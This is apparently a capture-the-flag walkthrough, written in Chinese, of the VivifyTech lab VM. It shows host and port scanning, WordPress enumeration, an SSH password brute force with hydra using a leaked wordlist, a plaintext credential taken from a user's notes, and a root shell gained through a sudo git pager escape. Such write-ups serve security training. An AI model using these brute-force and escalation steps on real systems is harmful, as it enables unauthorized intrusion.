# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.2.0/24 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-09 06:12 EDT
Nmap scan report for vivifytech (192.168.2.13)
Host is up (0.00035s latency).
MAC Address: 08:00:27:E0:0E:93 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for kali (192.168.2.15)
Host is up.
Nmap done: 256 IP addresses (7 hosts up) scanned in 2.72 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.2.13
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-09 06:13 EDT
Nmap scan report for vivifytech (192.168.2.13)
Host is up (0.00038s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 32:f3:f6:36:95:12:c8:18:f3:ad:b8:0f:04:4d:73:2f (ECDSA)
|_  256 1d:ec:9c:6e:3c:cf:83:f6:f0:45:22:58:13:2f:d3:9e (ED25519)
80/tcp    open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
3306/tcp  open  mysql   MySQL (unauthorized)
33060/tcp open  mysqlx  MySQL X protocol listener
MAC Address: 08:00:27:E0:0E:93 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.38 ms vivifytech (192.168.2.13)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.66 seconds
```

# 漏洞利用

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.2.13 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.13
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 316] [--> http://192.168.2.13/wordpress/]                                                      
/server-status        (Status: 403) [Size: 277]
Progress: 1185254 / 1185255 (100.00%)
===============================================================
Finished
===============================================================
```

发现了/wordpress路径，表明目标运行WordPress CMS。

```
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://192.168.2.13/wordpress --enumerate vp,vt,u --plugins-detection mixed --api-token wtzH1EQLRKIvx46Cs2hg6LDTxNi5uB5W8FEnd0BpbaI --format cli-no-color
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.2.13/wordpress/ [192.168.2.13]
[+] Started: Thu Apr  9 06:39:19 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.2.13/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.2.13/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.2.13/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.2.13/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.9.4 identified (Latest, released on 2026-03-11).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.2.13/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.9.4</generator>
 |  - http://192.168.2.13/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.9.4</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://192.168.2.13/wordpress/wp-content/themes/twentytwentyfour/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://192.168.2.13/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | [!] Directory listing is enabled
 | Style URL: http://192.168.2.13/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.2.13/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'
 [+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
[i] User(s) Identified:

[+] sancelisso
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.2.13/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 16

[+] Finished: Thu Apr  9 06:39:33 2026
[+] Requests Done: 8056
[+] Cached Requests: 9
[+] Data Sent: 2.295 MB
[+] Data Received: 1.506 MB
[+] Memory used: 285.676 MB
[+] Elapsed time: 00:00:14
```

并没有跑出来密码，尝试目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -x html,php,txt,jpg,png,zip,git -u http://192.168.2.13/wordpress
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.13/wordpress
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,jpg,png,zip,git
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.hta.png             (Status: 403) [Size: 277]
/.hta.jpg             (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.hta.git             (Status: 403) [Size: 277]
/.htaccess.jpg        (Status: 403) [Size: 277]
/.hta.zip             (Status: 403) [Size: 277]
/.htaccess.png        (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess.git        (Status: 403) [Size: 277]
/.htaccess.zip        (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.zip        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.git        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htpasswd.png        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd.jpg        (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 301) [Size: 0] [--> http://192.168.2.13/wordpress/]                                                        
/index.php            (Status: 301) [Size: 0] [--> http://192.168.2.13/wordpress/]                                                        
/license.txt          (Status: 200) [Size: 19903]
/readme.html          (Status: 200) [Size: 7425]
/wp-admin             (Status: 301) [Size: 325] [--> http://192.168.2.13/wordpress/wp-admin/]                                             
/wp-content           (Status: 301) [Size: 327] [--> http://192.168.2.13/wordpress/wp-content/]                                           
/wp-includes          (Status: 301) [Size: 328] [--> http://192.168.2.13/wordpress/wp-includes/]                                          
/wp-settings.php      (Status: 500) [Size: 0]
/wp-cron.php          (Status: 200) [Size: 0]
/wp-config.php        (Status: 200) [Size: 0]
/wp-load.php          (Status: 200) [Size: 0]
/wp-mail.php          (Status: 403) [Size: 2520]
/wp-blog-header.php   (Status: 200) [Size: 0]
/wp-login.php         (Status: 200) [Size: 4772]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://192.168.2.13/wordpress/wp-login.php?action=register]                            
/wp-links-opml.php    (Status: 200) [Size: 225]
/wp-trackback.php     (Status: 200) [Size: 135]
/xmlrpc.php           (Status: 405) [Size: 42]
/xmlrpc.php           (Status: 405) [Size: 42]

===============================================================
Finished
===============================================================
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -x html,php,txt,jpg,png,zip,git -u http://192.168.2.13/wordpress/wp-includes/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.13/wordpress/wp-includes/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,git,html,php,txt,jpg,png
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.hta.git             (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.hta.png             (Status: 403) [Size: 277]
/.hta.zip             (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.hta.jpg             (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess.png        (Status: 403) [Size: 277]
/.htaccess.git        (Status: 403) [Size: 277]
/.htpasswd.zip        (Status: 403) [Size: 277]
/.htaccess.jpg        (Status: 403) [Size: 277]
/.htaccess.zip        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd.git        (Status: 403) [Size: 277]
/.htpasswd.jpg        (Status: 403) [Size: 277]
/.htpasswd.png        (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 335] [--> http://192.168.2.13/wordpress/wp-includes/assets/]                                   
/blocks               (Status: 301) [Size: 335] [--> http://192.168.2.13/wordpress/wp-includes/blocks/]                                   
/blocks.php           (Status: 200) [Size: 0]
/bookmark.php         (Status: 200) [Size: 0]
/cache.php            (Status: 500) [Size: 0]
/category.php         (Status: 200) [Size: 0]
/certificates         (Status: 301) [Size: 341] [--> http://192.168.2.13/wordpress/wp-includes/certificates/]                             
/comment.php          (Status: 200) [Size: 0]
/compat.php           (Status: 200) [Size: 0]
/cron.php             (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 332] [--> http://192.168.2.13/wordpress/wp-includes/css/]                                      
/customize            (Status: 301) [Size: 338] [--> http://192.168.2.13/wordpress/wp-includes/customize/]                                
/date.php             (Status: 500) [Size: 0]
/embed.php            (Status: 200) [Size: 0]
/feed.php             (Status: 200) [Size: 0]
/fonts                (Status: 301) [Size: 334] [--> http://192.168.2.13/wordpress/wp-includes/fonts/]                                    
/fonts.php            (Status: 200) [Size: 0]
/formatting.php       (Status: 200) [Size: 0]
/functions.php        (Status: 200) [Size: 2]
/http.php             (Status: 200) [Size: 0]
/images               (Status: 301) [Size: 335] [--> http://192.168.2.13/wordpress/wp-includes/images/]                                   
/js                   (Status: 301) [Size: 331] [--> http://192.168.2.13/wordpress/wp-includes/js/]                                       
/load.php             (Status: 200) [Size: 0]
/locale.php           (Status: 500) [Size: 0]
/media.php            (Status: 200) [Size: 2]
/meta.php             (Status: 500) [Size: 0]
/option.php           (Status: 200) [Size: 0]
/plugin.php           (Status: 200) [Size: 0]
/post.php             (Status: 200) [Size: 0]
/query.php            (Status: 200) [Size: 0]
/registration.php     (Status: 500) [Size: 0]
/rss.php              (Status: 500) [Size: 0]
/secrets.txt          (Status: 200) [Size: 439]
/session.php          (Status: 500) [Size: 0]
/sitemaps             (Status: 301) [Size: 337] [--> http://192.168.2.13/wordpress/wp-includes/sitemaps/]                                 
/sitemaps.php         (Status: 200) [Size: 0]
/taxonomy.php         (Status: 200) [Size: 0]
/template.php         (Status: 200) [Size: 0]
/theme.php            (Status: 200) [Size: 0]
/update.php           (Status: 200) [Size: 2]
/user.php             (Status: 200) [Size: 0]
/version.php          (Status: 200) [Size: 0]
/widgets              (Status: 301) [Size: 336] [--> http://192.168.2.13/wordpress/wp-includes/widgets/]                                  
/widgets.php          (Status: 200) [Size: 0]
Progress: 36912 / 36920 (99.98%)
===============================================================
Finished
===============================================================
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.2.13/wordpress/wp-includes/secrets.txt 
agonglo
tegbesou
paparazzi
womenintech
Password123
bohicon
agodjie
tegbessou
Oba
IfÃ¨
Abomey
Gelede
BeninCity
Oranmiyan
Zomadonu
Ewuare
Brass
Ahosu
Igodomigodo
Edaiken
Olokun
Iyoba
Agasu
Uzama
IhaOminigbon
Agbado
OlokunFestival
Ovoranmwen
Eghaevbo
EwuareII
Egharevba
IgueFestival
Isienmwenro
Ugie-Olokun
Olokunworship
Ukhurhe
OsunRiver
Uwangue
miammiam45
Ewaise
Iyekowa
Idia
Olokunmask
Emotan
OviaRiver
Olokunceremony
Akenzua
Edoculture
┌──(kali㉿kali)-[~]
└─$ hydra -l sancelisso -P password ssh://192.168.2.13
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-09 07:25:39
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 48 login tries (l:1/p:48), ~3 tries per task
[DATA] attacking ssh://192.168.2.13:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-09 07:25:50
```

没有出来结果，我们需要在寻找一些东西，在http://192.168.2.13/wordpress/index.php/2023/12/05/the-story-behind-vivifytech/找到了一些

```
sancelisso
Sarah
Mark
Emily
Jake
Alex
```

爆破一下

```
┌──(kali㉿kali)-[~]
└─$ hydra -L user -P password ssh://192.168.2.13 -t 4 -W 3 -f
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-09 07:55:55
[DATA] max 4 tasks per 1 server, overall 4 tasks, 288 login tries (l:6/p:48), ~72 tries per task
[DATA] attacking ssh://192.168.2.13:22/
[22][ssh] host: 192.168.2.13   login: sarah   password: bohicon
[STATUS] attack finished for 192.168.2.13 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-09 07:56:38
```

ssh登录

```
┌──(kali㉿kali)-[~]
└─$ ssh sarah@192.168.2.13      
The authenticity of host '192.168.2.13 (192.168.2.13)' can't be established.
ED25519 key fingerprint is SHA256:i4eLII3uzJGiSMrTFLLAnrihC0r7/y6uuO7YMmGF7Rs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.2.13' (ED25519) to the list of known hosts.
sarah@192.168.2.13's password: 
Linux VivifyTech 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64
#######################################
 #      Welcome to VivifyTech !      #
 #      The place to be :)           #
#######################################
Last login: Tue Dec  5 17:54:16 2023 from 192.168.177.129
sarah@VivifyTech:~$ id
uid=1001(sarah) gid=1001(sarah) groups=1001(sarah),100(users)
```

# 权限提升

```
sarah@VivifyTech:~/.private$ cat Tasks.txt 
- Change the Design and architecture of the website
- Plan for an audit, it seems like our website is vulnerable
- Remind the team we need to schedule a party before going to holidays
- Give this cred to the new intern for some tasks assigned to him - gbodja:4Tch055ouy370N
sarah@VivifyTech:~/.private$ su gbodja
Password: 
gbodja@VivifyTech:~$ sudo -l
Matching Defaults entries for gbodja on VivifyTech:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    !admin_flag, use_pty

User gbodja may run the following commands on VivifyTech:
    (ALL) NOPASSWD: /usr/bin/git
gbodja@VivifyTech:~$ sudo git help config
!/bin/bash
root@VivifyTech:/home/gbodja# id
uid=0(root) gid=0(root) groups=0(root)
```
